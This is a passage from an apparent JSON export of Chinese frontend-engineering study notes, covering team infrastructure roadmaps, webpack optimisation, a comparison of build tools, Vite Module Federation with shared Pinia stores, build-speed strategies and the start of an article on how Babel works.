可以促进建立更标准的接口范式、封装通用的服务(有利于业务组件复用)、更深的有业务中台、BFF…\n\n## 3. 前端基础建设路线参考\n\n>  如何解决研发管理混乱，基础设施薄弱的问题 ？\n\n### 3.1. **评估现状（1-2周）**\n\n   - 调研现有项目代码质量和架构\n   - 了解团队成员技术栈和能力水平\n   - 梳理现有开发流程和痛点\n   - ==收集==团队成员的反馈和建议\n\n### 3.2. **建立基础设施（1-2个月）**\n\n#### 3.2.1. 代码管理规范\n\n   - 统一 Git 分支管理策略（如 Git Flow ）\n   - 制定代码提交规范（约定式提交）\n   - 建立 Code Review 机制\n\n#### 3.2.2. 技术栈统一\n\n   - 确定主要技术栈（如 React/Vue ）\n   - 统一构建工具（如 Vite ）\n   - 规范包管理器使用（如 pnpm ）\n\n#### 3.2.3. 工程化体系建设\n\n   - 脚手架\n   - 多包管理\n   - 建立组件库\n   - 配置 ESLint + Prettier + StyleLint\n   - 引入 TypeScript \n\n### 3.3. **规范制定（2-3周）**\n\n#### 3.3.1. 开发规范\n\n- JavaScript/TypeScript 编码规范\n- CSS/SCSS 命名规范（如 BEM）\n- 组件开发规范\n- 目录结构规范\n\n#### 3.3.2. 文档规范\n\n- 技术文档模板\n- API文档规范\n- 组件文档规范\n- README模板\n\n### 3.4. **流程优化（持续进行）**\n\n#### 3.4.1. 开发流程\n\n- 引入敏捷开发\n- 建立任务管理系统（如 Jira ）\n- 规范开发-测试-部署流程\n\n#### 3.4.2. CI/CD\n\n- 配置自动化测试\n- 配置自动化部署\n- 配置自动化版本发布\n\n### 3.5. **质量保障（持续进行）**\n\n- 单元测试覆盖率要求\n- E2E测试\n- 性能监控\n- 错误监控（如 `Sentry` ）\n- 代码质量检测（如 `SonarQube` ）\n\n### 3.6. **团队技术文化建设（持续进行）**\n\n- 定期技术分享\n- 代码评审文化\n- 建立技术文档库\n- 新人培训体系\n\n### 3.7. 其他建议\n\n#### 3.7.1. **循序渐进**\n\n- 不要一次性推动所有变革\n- 按优先级分步实施\n- 给团队适应的时间\n\n#### 3.7.2. **获取支持**\n\n- 争取管理层支持\n- 与团队充分沟通\n- 展示改进带来的价值\n\n#### 3.7.3. **持续优化**\n\n- 定期收集反馈\n- 及时调整方案\n- 保持技术栈更新\n\n#### 3.7.4. **注重实效**\n\n- 避免过度设计\n- 关注投入产出比\n- 优先解决主要矛盾\n\n### 3.8. 参考路线图\n\n![图片&文件](./files/20241028.png)\n\n### 3.9. 其他\n\n- 文档，重要性不言而喻。`有事先看文档，再问别人`\n- 如果没有`约束机制`，规范永远只是规范\n- 避免黑盒\n\t- `解决单点故障` 的唯一办法是**让更多的成员交叉参与不同的项目**，\n\t- 代码`review`方式等多种方式熟悉项目代码，规范就体现的很重要\n\n","ToqPjGb2":"\n# 开源的 git 托管工具\n\n`#devops` \n\n\n- 常用的开源工具\n\t- gitlab 企业版本\n\t\t- 内置 CI/CD\n\t- gerrit 可集成 CI/CD 工具\n\t\t- Jenkins\n\t\t- Drone\n- 运维备份 → ==很重要==\n- 集成监控\n\t- Prometheus\n\t- Grafana\n\t- ELK Stack\n\n\n![496](#)","4pwmWIcb":"\n# webpack 性能优化的思路\n\n`#webpack` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 使用 `include/exclude` 缩小文件搜索范围\n- 添加 `cache-loader`，将结果缓存到磁盘里\n- 使用 `hard-source-webpack-plugin` 为模块提供**中间缓存**\n- 使用 thread-loader 或 parallel-webpack 实现**多进程打包**\n- 配置 `resolve.alias` 简化引用路径\n- 使用 `resolve.modules` 指定模块搜索目录\n- 使用 `noParse` 跳过对已知无依赖模块的解析\n- 合理使用 `externals` ==外部化一些大型库==\n- 优化打包体积\n\t- 代码分割 `splitChunks`\n\t- Tree Shaking\n\t- 压缩代码\n- 优化运行时性能\n\t- 启用持久化缓存\n\t- 懒加载：动态 import\n- 分析和监控\n\t- 分析工具\n\t\t- webpack-bundle-analyzer：可视化分析打包结果\n\t- 速度分析：\n\t\t- speed-measure-webpack-plugin：分析各个 loader 和 plugin 的执行时间\n- DLL 动态链接库\n- 合理使用 sourceMap\n\t- 开发环境使用 `eval-cheap-module-source-map`\n\t- 生产环境可以选择不使用或使用 `nosources-source-map`\n\n---\n\n\n> 更多可参考 [14.  前端构建提速的体系化思路](/post/NNGKpVrs.html)\n\n## 2. 优化打包速度\n\n### 2.1. 使用 `include/exclude` 缩小文件搜索范围\n\n```javascript\nmodule: {\n  rules: [\n    {\n      test: /\\.js$/,\n      loader: 'babel-loader',\n      include: path.resolve(__dirname, 'src'), // 只处理 src 目录\n      exclude: /node_modules/  // 排除 node_modules\n    }\n  ]\n}\n```\n\n### 2.2. 使用 cache-loader\n\n- 在一些性能开销较大的 loader 之前添加 `cache-loader`，将结果缓存到磁盘里\n\n```javascript\nmodule: {\n  rules: [\n    {\n      test: /\\.js$/,\n      use: ['cache-loader', 'babel-loader']\n    }\n  ]\n}\n```\n\n### 2.3. 使用 `hard-source-webpack-plugin` 为模块提供**中间缓存**\n\n### 2.4. 开启多进程打包\n\n- 使用 thread-loader 或 parallel-webpack 实现**多进程打包**\n\n```javascript\nmodule: {\n  rules: [\n    {\n      test: /\\.js$/,\n      use: ['thread-loader', 'babel-loader']\n    }\n  ]\n}\n```\n\n### 2.5. 其他\n\n- 配置 `resolve.alias` 简化引用路径\n- 使用 `resolve.modules` 指定模块搜索目录\n- 使用 `noParse` 跳过对已知无依赖模块的解析\n- 合理使用 `externals` 外部化一些大型库\n\n![图片&文件](./files/20241101-74.png)\n\n## 3. 优化打包体积\n\n### 3.1. 代码分割（Code Splitting）\n\n```javascript hl:2\noptimization: {\n  splitChunks: {\n    chunks: 'all',\n    minSize: 30000,\n    minChunks: 1,\n    cacheGroups: {\n      vendors: {\n        test: /[\\\\/]node_modules[\\\\/]/,\n        priority: -10\n      },\n      default: {\n        minChunks: 2,\n        priority: -20,\n        reuseExistingChunk: true\n      }\n    }\n  }\n}\n```\n\n#### 3.1.1. Tree Shaking\n\n- 在 package.json 中设置 `\"sideEffects\": false`\n- 使用 ES6 模块语法（import/export）\n- 启用生产模式（production mode）\n\n#### 3.1.2. 压缩代码\n\n```javascript\noptimization: {\n  minimize: true,\n  minimizer: [\n    new TerserPlugin({\n      parallel: true // 开启多进程压缩\n    })\n  ]\n}\n```\n\n## 4. 优化运行时性能\n\n### 4.1. 启用持久化缓存\n\n```javascript\noptimization: {\n  runtimeChunk: 'single',\n  moduleIds: 'deterministic'\n}\n```\n\n### 4.2. 懒加载\n\n```javascript\n// 使用动态 import 实现懒加载\nconst Home = () => import('./pages/Home');\n```\n\n## 5. 分析和监控\n\n### 5.1. 使用分析工具\n\n- webpack-bundle-analyzer：可视化分析打包结果\n```javascript\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  plugins: [\n    new BundleAnalyzerPlugin()\n  ]\n}\n```\n\n### 5.2. 速度分析\n\n- speed-measure-webpack-plugin：分析各个 loader 和 plugin 的执行时间\n\n## 6. DLL 动态链接库\n\n```javascript\n// webpack.dll.config.js\nnew webpack.DllPlugin({\n  path: path.join(__dirname, 'dist', '[name]-manifest.json'),\n  name: '[name]_library'\n})\n\n// webpack.config.js\nnew webpack.DllReferencePlugin({\n  manifest: require('./dist/vendor-manifest.json')\n})\n```\n\n## 7. 其他优化措施\n\n### 7.1. 合理使用 sourceMap\n\n- 开发环境使用 `eval-cheap-module-source-map`\n- 生产环境可以选择不使用或使用 `nosources-source-map`\n\n### 7.2. 优化解析配置\n\n```javascript\nresolve: {\n  extensions: ['.js', '.jsx'], // 指定优先级\n  alias: {\n    '@': path.resolve(__dirname, 'src') // 设置别名\n  }\n}\n```\n\n","qysbGrug":"\n# 主流的前端构建工具\n\n`#webpack` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Rspack\n\t- 基于 Rust \n\t- 兼容 webpack\n- Vite\n\t- unbundle 的代表\n\t\t- 开发环境使用原生 ESM，启动速度快\n\t- 开发环境使用 esbuild\n\t- 生成使用 rollup\n- Turbopack\n\t- Rust 编写\n\t- 与 Next.js 深度集成\n\t- 做到函数级别缓存\n- esbuild\n\t- 用 Go 语言编写\n\t- vite 依赖它\n- Webpack 5\n\t- 最成熟的解决方案，生态好\n\t- 大型项目==慢==\n- Parcel\n\t- 零配置\n- SWC (Speedy Web Compiler)\n\t- 用 Rust 编写的超快的 TypeScript/JavaScript 编译器\n\t- 比 Babel 快 20 倍\n\n## 2. Rspack\n\n- 基于 Rust 的高性能 Web 打包工具\n- 使用兼容 API 无缝替换 webpack\n![图片&文件](./files/20241129.png)\n\n> 没实际生产中用过\n\n## 3. Vite\n\n1. 开发环境使用原生 ESM，启动速度快\n2. 生产环境使用 Rollup 构建\n3. 内置对 TypeScript、JSX、CSS 等的支持\n4. 优秀的 HMR 性能\n\n### 3.1. 为什么 vite HMR 性能比较好\n\n![图片&文件](./files/20241101-33.png)\n\n## 4. Turbopack (Next.js 13 的构建工具)\n\n`Turbopack` 是 `Vercel` 推出的新一代打包工具，使用 Rust 编写。\n\n```javascript\n// next.config.js\nmodule.exports = {\n  experimental: {\n    turbo: {\n      loaders: {\n        // 自定义加载器配置\n        '.png': ['file-loader'],\n        '.svg': ['@svgr/webpack']\n      },\n      resolveAlias: {\n        '@': path.resolve(__dirname, 'src')\n      }\n    }\n  }\n}\n```\n\n主要特点：\n\n1. 极快的构建速度（声称比 Vite 快 10 倍）\n2. 增量计算\n3. 与 Next.js 深度集成\n4. 内存缓存优化\n\n## 5. esbuild\n\n超快的 JavaScript 打包器，用 Go 语言编写。\n\n主要特点：\n1. 极致的构建速度\n2. 支持 TypeScript 和 JSX\n3. 体积小，无依赖\n4. API 简单直观\n\n## 6. Rollup\n\n面向 ESM 的专业打包工具。\n\n主要特点：\n1. 优秀的 Tree-shaking\n2. 支持多种输出格式\n3. 插件生态丰富\n4. 适合库的打包\n\n## 7. Webpack 5\n\n仍然是最成熟的解决方案。\n\n主要特点：\n1. 功能最完整\n2. 生态系统最大\n3. 配置灵活\n4. 支持模块联邦\n\n## 8. Parcel\n\n零配置的构建工具。\n\n```javascript\n// package.json\n{\n  \"source\": \"src/index.html\",\n  \"scripts\": {\n    \"start\": \"parcel\",\n    \"build\": \"parcel build\"\n  }\n}\n// 可选的 .parcelrc 配置\n{\n  \"extends\": \"@parcel/config-default\",\n  \"transformers\": {\n    \"*.{ts,tsx}\": [\"@parcel/transformer-typescript-tsc\"]\n  }\n}\n```\n\n主要特点：\n1. 零配置\n2. 自动安装依赖\n3. 多核并行处理\n4. 内置优化功能\n\n## 9. SWC (Speedy Web Compiler)\n\n用 Rust 编写的超快的 TypeScript/JavaScript 编译器。\n\n```javascript\n// .swcrc\n{\n  \"jsc\": {\n    \"parser\": {\n      \"syntax\": \"typescript\",\n      \"tsx\": true\n    },\n    \"transform\": {\n      \"react\": {\n        \"runtime\": \"automatic\"\n      }\n    },\n    \"target\": \"es2015\"\n  },\n  \"minify\": true\n}\n```\n\n主要特点：\n1. 比 Babel 快 20 倍\n2. 可作为其他构建工具的编译器\n3. 支持 TypeScript 和 JSX\n4. 提供独立的 CLI 工具\n\n## 10. 构建工具对比\n\n| 工具        | 开发体验 | 构建速度 | 配置复杂度 | 生态系统 | 适用场景        |\n| --------- | ---- | ---- | ----- | ---- | ----------- |\n| Vite      | 极佳   | 快    | 低     | 良好   | **现代Web应用** |\n| Turbopack | 极佳   | 极快   | 中     | 发展中  | Next.js项目   |\n| esbuild   | 好    | 极快   | 低     | 一般   | 简单项目/工具库    |\n| Rollup    | 好    | 中等   | 中     | 丰富   | 库开发         |\n| Webpack   | 好    | 中等   | 高     | 最丰富  | 复杂应用        |\n| Parcel    | 极佳   | 快    | 极低    | 一般   | 小型项目        |\n| SWC       | 好    | 极快   | 低     | 发展中  | 编译器/工具链     |\n\n","zjmJ8Ccg":"\n# vite 中如何使用 Module Federation\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- vite 中使用 `@originjs/vite-plugin-federation` 插件来实现模块联邦功能\n- 使用远程组件：`defineAsyncComponent`\n- 使用 `defineAsyncComponent` 错误处理和降级策略\n\t- 建议好好实现\n- 如何在 Vite 的 Module Federation 中共享 Pinia 状态\n\t- 在`主应用和远程应用`中都配置 Pinia 作为共享依赖\n\t- `远程应用`中定义 Store ，并暴露 Store\n- 共享实例\n\t- 建议：vue 和 pinia 、 vue-router ==必须单例==\n\n## 2. 定义\n\n在 Vite 中，我们可以使用 `@originjs/vite-plugin-federation` 插件来实现模块联邦功能。\n\n> webpack 中使用模块联邦可参考 [10. Webpack 5 的 Module Federation](/post/8wPPOjJ7.html)\n\n## 3. 基本配置示例\n\n### 3.1. 主应用（Host）配置\n\n```typescript hl:10,15\n// vite.config.ts\nimport { defineConfig } from 'vite'\nimport federation from '@originjs/vite-plugin-federation'\n\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'host-app',\n      remotes: {\n        remoteApp: {\n          external: 'http://localhost:5001/assets/remoteEntry.js',\n          format: 'esm'\n        }\n      },\n      shared: ['vue', 'pinia'] // 共享依赖\n    })\n  ]\n})\n```\n\n### 3.2. 远程应用（Remote）配置\n\n```typescript hl:10\n// vite.config.ts\nimport { defineConfig } from 'vite'\nimport federation from '@originjs/vite-plugin-federation'\n\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'remote-app',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './Button': './src/components/Button.vue',\n        './Header': './src/components/Header.vue'\n      },\n      shared: ['vue', 'pinia']\n    })\n  ],\n  build: {\n    target: 'esnext'\n  }\n})\n```\n\n## 4. 使用远程组件\n\n```vue hl:15\n<!-- 主应用中使用远程组件 -->\n<template>\n  <div>\n    <h1>Host Application</h1>\n    <Suspense>\n      <RemoteButton />\n    </Suspense>\n  </div>\n</template>\n\n<script setup>\nimport { defineAsyncComponent } from 'vue'\n\nconst RemoteButton = defineAsyncComponent(() => \n  import('remoteApp/Button')\n)\n</script>\n```\n\n## 5. 带版本控制的共享依赖\n\n```typescript hl:15\n// vite.config.ts\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'host-app',\n      remotes: {\n        remoteApp: 'http://localhost:5001/assets/remoteEntry.js'\n      },\n      shared: {\n        vue: { \n          requiredVersion: '^3.2.0',\n          singleton: true \n        },\n        'vue-router': {\n          requiredVersion: '^4.0.0',\n          singleton: true\n        }\n      }\n    })\n  ]\n})\n```\n\n## 6. 动态远程加载\n\n```typescript hl:8\n// vite.config.ts\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'host-app',\n      remotes: {\n        remoteApp: {\n          external: `Promise.resolve('http://localhost:5001/assets/remoteEntry.js')`,\n          format: 'esm'\n        }\n      }\n    })\n  ]\n})\n```\n\n## 7. 开发模式配置\n\n```typescript\n// vite.config.ts\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'remote-app',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './components': './src/components/index.ts'\n      },\n      shared: ['vue']\n    })\n  ],\n  build: {\n    target: 'esnext',\n    minify: false,\n    cssCodeSplit: false,\n    sourcemap: true\n  }\n})\n```\n\n## 8. 错误处理和降级策略\n\n下面是一个包装后的 `RemoteComponent` 组件\n\n```vue\n<template>\n  <Suspense>\n    <template `#default>`\n      <RemoteComponent />\n    </template>\n    <template `#fallback>`\n      <div>Loading remote component...</div>\n    </template>\n  </Suspense>\n</template>\n\n<script setup>\nimport { defineAsyncComponent, h } from 'vue'\n\nconst RemoteComponent = defineAsyncComponent({\n  loader: () => import('remoteApp/Component'),\n  loadingComponent: () => h('div', 'Loading...'),\n  errorComponent: () => h('div', 'Failed to load component'),\n  delay: 200,\n  timeout: 3000\n})\n</script>\n```\n\n## 9. 示例：如何在 Vite 的 Module Federation 中共享 Pinia 状态\n\n### 9.1. 首先需要在`主应用和远程应用`中都配置 Pinia 作为共享依赖\n\n```typescript\n// vite.config.ts (主应用和远程应用都需要配置)\nimport { defineConfig } from 'vite'\nimport federation from '@originjs/vite-plugin-federation'\n\nexport default defineConfig({\n  plugins: [\n    federation({\n      // ... 其他配置\n      shared: {\n        vue: {\n          singleton: true,\n          requiredVersion: '^3.0.0'\n        },\n        pinia: {\n          singleton: true,\n          requiredVersion: '^2.0.0'\n        }\n      }\n    })\n  ]\n})\n```\n\n> 创建共享 Store\n\n### 9.2. `远程应用`中定义 Store ，并暴露 Store\n\n#### 9.2.1. 定义 Store \n\n```typescript\n// remote-app/src/stores/counter.ts\nimport { defineStore } from 'pinia'\n\nexport const useCounterStore = defineStore('counter', {\n  state: () => ({\n    count: 0,\n    message: 'Hello from Remote App'\n  }),\n  \n  actions: {\n    increment() {\n      this.count++\n    },\n    decrement() {\n      this.count--\n    },\n    setMessage(msg: string) {\n      this.message = msg\n    }\n  },\n  \n  getters: {\n    doubleCount(): number {\n      return this.count * 2\n    }\n  }\n})\n\n// 导出 store 定义\nexport type CounterStore = ReturnType<typeof useCounterStore>\n```\n\n#### 9.2.2. 暴露 Store\n\n```typescript\n// remote-app/src/stores/index.ts\nexport { useCounterStore } from './counter'\n\n// vite.config.ts (远程应用)\nexport default defineConfig({\n  plugins: [\n    federation({\n      name: 'remote-app',\n      filename: 'remoteEntry.js',\n      exposes: {\n        './stores': './src/stores/index.ts'\n      },\n      shared: {\n        vue: { singleton: true },\n        pinia: { singleton: true }\n      }\n    })\n  ]\n})\n```\n\n### 9.3. 主应用创建 Pinia 实例，并使用远程 Store\n\n#### 9.3.1. 主应用中创建 Pinia 实例\n\n```typescript\n// host-app/src/main.ts\nimport { createApp } from 'vue'\nimport { createPinia } from 'pinia'\nimport App from './App.vue'\n\nconst app = createApp(App)\nconst pinia = createPinia()\n\napp.use(pinia)\napp.mount('#app')\n```\n\n#### 9.3.2. 主应用中使用远程 Store\n\n```typescript hl:17\n// host-app/src/components/Counter.vue\n<template>\n  <div>\n    <h2>Counter from Remote Store</h2>\n    <p>Count: {{ counter.count }}</p>\n    <p>Double Count: {{ counter.doubleCount }}</p>\n    <p>Message: {{ counter.message }}</p>\n    \n    <button @click=\"counter.increment()\">Increment</button>\n    <button @click=\"counter.decrement()\">Decrement</button>\n    <button @click=\"updateMessage\">Update Message</button>\n  </div>\n</template>\n\n<script setup lang=\"ts\">\nimport { onMounted } from 'vue'\nimport { useCounterStore } from 'remoteApp/stores'\n\nconst counter = useCounterStore()\n\nconst updateMessage = () => {\n  counter.setMessage('Updated from Host App')\n}\n\nonMounted(() => {\n  // 初始化操作\n  console.log('Store mounted in host app')\n})\n</script>\n```\n\n#### 9.3.3. 在主应用中扩展远程 Store\n\n```typescript\n// host-app/src/stores/enhancedCounter.ts\nimport { defineStore } from 'pinia'\nimport { useCounterStore } from 'remoteApp/stores'\n\nexport const useEnhancedCounterStore = defineStore('enhancedCounter', {\n  state: () => ({\n    localData: 'Host App Data'\n  }),\n  \n  actions: {\n    async complexAction() {\n      const remoteCounter = useCounterStore()\n      remoteCounter.increment()\n      this.localData = `Updated after remote count: ${remoteCounter.count}`\n    }\n  },\n  \n  getters: {\n    combinedInfo(): string {\n      const remoteCounter = useCounterStore()\n      return `${this.localData} - Remote Count: ${remoteCounter.count}`\n    }\n  }\n})\n```\n\n## 10. 配置建议参考\n\n### 10.1. 基础配置建议：vue 和 pinia 、 vue-router 必须单例\n\n```javascript hl:8,15\n// vite.config.js\nexport default defineConfig({\n  plugins: [\n    federation({\n      shared: {\n        // Vue 核心运行时\n        vue: {\n          singleton: true,       // 确保整个应用只有一个 Vue 实例\n          requiredVersion: '^3.3.0', // 指定 Vue 版本范围\n          strictVersion: true,   // 强制版本匹配，防止运行时错误\n          eager: true           // 立即加载 Vue，而不是按需加载\n        },\n        // Pinia 状态管理\n        pinia: {\n          singleton: true,       // 必须单例！确保状态管理的一致性\n          requiredVersion: '^2.1.0',\n          strictVersion: true,   // 严格版本控制，避免状态管理异常\n          eager: true           // 预加载，因为状态管理是核心功能\n        },\n        // Vue Router 路由管理\n        'vue-router': {\n          singleton: true,       // 路由实例必须唯一\n          requiredVersion: '^4.2.0',\n          strictVersion: true,   // 严格版本控制，避免路由冲突\n          eager: true           // 预加载路由，避免首次加载延迟\n        }\n      }\n    })\n  ]\n})\n```\n\n### 10.2. 主应用配置\n\n```javascript\n// host-app/vite.config.js\nimport { defineConfig } from 'vite'\nimport vue from '@vitejs/plugin-vue'\nimport federation from '@originjs/vite-plugin-federation'\n\nexport default defineConfig({\n  plugins: [\n    vue(),\n    federation({\n      name: 'host',           // 主应用名称\n      remotes: {\n        // 配置远程应用的入口\n        remote_app: 'http://localhost:5001/remoteEntry.js'\n      },\n      shared: {\n        // 核心运行时依赖\n        vue: {\n          singleton: true,\n          requiredVersion: '^3.3.0',\n          strictVersion: true,\n          eager: true\n        },\n        // Pinia 配置\n        pinia: {\n          singleton: true,     // 确保 Pinia store 全局唯一\n          requiredVersion: '^2.1.0',\n          strictVersion: true, // 严格控制版本，确保状态管理的稳定性\n          eager: true         // 预加载 Pinia\n        },\n        // Vue Router 配置\n        'vue-router': {\n          singleton: true,     // 路由实例必须唯一\n          requiredVersion: '^4.2.0',\n          strictVersion: true,\n          eager: true\n        },\n        // Element Plus UI 库配置\n        'element-plus': {\n          singleton: true,     // UI 库也保持单例\n          requiredVersion: '^2.4.0',\n          strictVersion: false, // UI 库版本可以稍微宽松一点\n          eager: false         // UI 组件按需加载，优化首屏加载\n        },\n        // VueUse 工具库配置\n        '@vueuse/core': {\n          singleton: true,\n          requiredVersion: '^10.5.0',\n          strictVersion: false, // 工具库版本可以宽松\n          eager: false         // 按需加载，优化性能\n        }\n      }\n    })\n  ]\n})\n```\n\n### 10.3. 远程应用配置\n\n```javascript\n// remote-app/vite.config.js\nexport default defineConfig({\n  plugins: [\n    vue(),\n    federation({\n      name: 'remote_app',    // 远程应用名称\n      filename: 'remoteEntry.js', // 远程应用入口文件名\n      exposes: {\n        // 暴露组件和 store 给主应用使用\n        './Feature': './src/components/Feature.vue',\n        './store': './src/stores/feature.js'\n      },\n      shared: {\n        // 与主应用保持一致的依赖配置\n        vue: {\n          singleton: true,\n          requiredVersion: '^3.3.0',\n          strictVersion: true,\n          eager: true\n        },\n        pinia: {\n          singleton: true,\n          requiredVersion: '^2.1.0',\n          strictVersion: true,\n          eager: true\n        }\n      }\n    })\n  ]\n})\n```\n\n### 10.4. 主应用 Store 设置\n\n```typescript\n// host-app/src/stores/index.ts\nimport { createPinia } from 'pinia'\n\n// 创建 Pinia 实例\nexport const pinia = createPinia()\n\n// 定义主应用的 store\nexport const useMainStore = defineStore('main', {\n  state: () => ({\n    // 主应用全局状态\n    globalSettings: {},\n    userInfo: {},\n    // ... 其他状态\n  }),\n  actions: {\n    // 主应用全局动作\n    async initializeApp() {\n      // 应用初始化逻辑\n    }\n  }\n})\n```\n\n### 10.5. 远程应用 Store 设置\n\n```typescript\n// remote-app/src/stores/feature.ts\nimport { defineStore } from 'pinia'\n\nexport const useFeatureStore = defineStore('feature', {\n  state: () => ({\n    // 使用命名空间避免与主应用状态冲突\n    featureData: null,\n    featureStatus: 'idle',\n    // ... 特性相关状态\n  }),\n  actions: {\n    // 添加特性前缀避免方法名冲突\n    async initializeFeature() {\n      // 特性初始化逻辑\n    },\n    // 确保 action 名称具有特性标识\n    featureSpecificAction() {\n      // 特性特定的动作\n    }\n  }\n})\n```\n\n## 11. 注意事项\n\n- 确保将构建目标设置为 `esnext`，以支持动态导入\n- 在生产环境中考虑启用代码分割和压缩\n- 开发时建议禁用代码压缩，便于调试，并启动 sourcemap\n- 使用 `singleton` 模式避免多个版本共存\n\t- 确保**共享依赖在整个应用中只加载一个实例**\n- `eager`: 决定共享依赖的加载时机\n\t- true: 立即加载（同步加载）\n\t- false: 按需加载（异步加载）\n- 明确指定共享依赖的版本要求\n- 实现合适的加载状态和错误提示及降级方案\n\n","NNGKpVrs":"\n# 前端构建提速的体系化思路\n\n\n`#前端构建` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 构建相关 6 个时代\n\t1. script 时代\n\t2. 大文件时代：gulp grunt iife\n\t3. amd cmd 时代\n\t4. webpack 时代\n\t5. esm 时代\n\t6. now ?\n- 构建提速的体系化思路\n\t- 构建每个阶段都耗时，下面按照最慢 → 最快的顺序\n\t\t- 编译 dependency最慢\n\t\t- 压缩 js \n\t\t- 编译 src\n\t\t- 生成 sourcemap\n\t\t- 压缩 css \n\t\t\t- 可以对js/或者css做==无用抹除==\n\t- 提速的三个思路\n\t\t- ==①== 缓存：做过的事情不做二遍，比如\n\t\t\t- extenals\n\t\t\t\t- 标识这些依赖项不需要打包，运行时从外部获取这些依赖\n\t\t\t- dll\n\t\t\t\t- 把公共代码打包成 dll 文件放到硬盘里\n\t\t\t- cache-loader  \n\t\t\t- hard-source-webpack-plugin 等\n\t\t- ==②== 延迟处理\n\t\t\t- sourcemap 延迟\n\t\t\t- 按需编译\n\t\t\t\t- vite \n\t\t- ==③== 高级语言\n\t\t\t- esbuild \n\t\t\t- swc \n\t\t\t- rspack 等等\n- npm 包上 cdn 方案\n\t- ==ESM CDN 方案==\n\t- 类似于 unpkg 方案\n\n---\n\n另外可参考：\n- [12. 主流的前端构建工具](/post/qysbGrug.html)\n- [11.   webpack 性能优化的思路](/post/4pwmWIcb.html)\n\n> 源于 umi 作者 CC 大佬的分享 GMTC 分享\n\n## 2. 构建相关 5 个时代\n\n![图片&文件](./files/20241101-34.png)\n\n### 2.1. 文件即scrip时代\n\n![图片&文件](./files/20241101-35.png)\n\n### 2.2. 大文件时代：grunt/gulp/iife\n\n![图片&文件](./files/20241101-36.png)\n\n### 2.3. AMD 和 CMD 时代\n\n![图片&文件](./files/20241101-37.png)\n\n三个问题都解决了\n\n### 2.4. webpack 时代\n\n![图片&文件](./files/20241101-38.png)\n\n虽然三个问题都解决了，但新的问题又出现了\n\n![图片&文件](./files/20241101-39.png)\n\n举个例子\n\n![图片&文件](./files/20241101-41.png)\n\n不同的慢有不同的解\n\n![图片&文件](./files/20241101-42.png)\n\n### 2.5. esm 年代\n\n![图片&文件](./files/20241101-43.png)\n\n> 后面说\n\n## 3. 构建提速的体系化思路\n\n### 3.1. 构建每个阶段都耗时\n\n> 编译 dependency 最慢！！！\n\n![图片&文件](./files/20241101-44.png)\n\n![图片&文件](./files/20241101-45.png)\n\n### 3.2. 提速的三个思路\n\n![图片&文件](./files/20241101-46.png)\n\n#### 3.2.1. 缓存\n\n![图片&文件](./files/20241101-47.png)\n\n#### 3.2.2. 延迟处理\n\n![图片&文件](./files/20241101-48.png)\n\n#### 3.2.3. native code\n\n![图片&文件](./files/20241101-49.png)\n\n#### 3.2.4. 提速方案三个思路的应用：注意颜色\n\n![图片&文件](./files/20241101-51.png)\n\n### 3.3. 传统提速方案：`externals`\n\n- `externals`：用于标记不用打包的库模块，如`JQuery、react-dom`等。可以直接通过script的方式加载\n\t- `externals` 配置选项提供了「从输出的 bundle 中排除依赖」的方法。相当于说：\"==这些依赖项不需要打包，运行时从外部获取这些依赖==\"。\n\n![图片&文件](./files/20241101-54.png)\n\n![图片&文件](./files/20241101-55.png)\n\n可用`auto externals`来解决配置复杂问题\n\n![图片&文件](./files/20241101-56.png)\n\n### 3.4. 传统提速方案：dll **动态链接库**\n\n![图片&文件](./files/20241101-57.png)\n\n![图片&文件](./files/20241101-58.png)\n\n### 3.5. 传统提速方案：按需编译\n\n![图片&文件](./files/20241101-61.png)\n\n### 3.6. 传统生产优化思路\n\n#### 3.6.1. webpack构建中tree shaking\n\n![图片&文件](./files/20241101-59.png)\n\n#### 3.6.2. 无用抹除\n\n可以对js/或者css做无用抹除，css需要引入包`npm i purgecss-webpack-plugin -D`\n\n#### 3.6.3. webpack构建中 scope Hoisting\n\n![图片&文件](./files/20241101-60.png)\n\n### 3.7. 当代提速思路\n\n#### 3.7.1. umi\n\n![图片&文件](./files/20241101-62.png)\n\n![图片&文件](./files/20241101-63.png)\n\n#### 3.7.2. vite\n\n![图片&文件](./files/20241101-64.png)\n\n#### 3.7.3. umi 的 mfsu\n\n![图片&文件](./files/20241101-65.png)\n\n使用 Module Federation （云组件）了\n\n![图片&文件](./files/20241101-66.png)\n\n![图片&文件](./files/20241101-67.png)\n\n![图片&文件](./files/20241101-68.png)\n\n### 3.8. ESM CDN ⽅案\n\n![图片&文件](./files/20241101-69.png)\n\n![图片&文件](./files/20241101-70.png)\n\n![图片&文件](./files/20241101-71.png)\n\n## 4. 总结\n\n![图片&文件](./files/20241101-72.png)\n\n","518guTpm":"\n# Babel  的原理（篇一）\n\n\n`#babel` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 源码 → 解析 → token → AST \n\t- 多叉树遍历 → 生成代码 → 目标代码\n- babel 插件系统\n\n## 1. Babel 的整体工作流程图\n\n````mermaid\n\n    graph TB\n    A[源代码] --> B[Parse解析]\n    B --> C[词法分析<br>Tokenizer]\n    C --> D[语法分析<br>Parser]\n    D --> E[AST<br>抽象语法树]\n    E --> F[Transform转换]\n    F --> G[遍历<br>Traverse]\n    G --> H[访问<br>Visitor]\n    H --> I[修改AST]\n    I --> J[Generate生成]\n    J --> K[目标代码]\n````\n\n## 2. 解析（Parse）\n\n   - 词法分析（Tokenizer）：将源代码转换成令牌（Token）流\n   - 语法分析（Parser）：将令牌流转换成 AST\n   \n让我们看一个具体的例子：\n\n```javascript\n// 源代码\nconst sum = (a, b) => a + b;\n\n// 词法分析后的 Tokens（简化表示）\n[\n  { type: \"keyword\", value: \"const\" },\n  { type: \"identifier\", value: \"sum\" },\n  { type: \"operator\", value: \"=\" },\n  { type: \"punctuator\", value: \"(\" },\n  { type: \"identifier\", value: \"a\" },\n 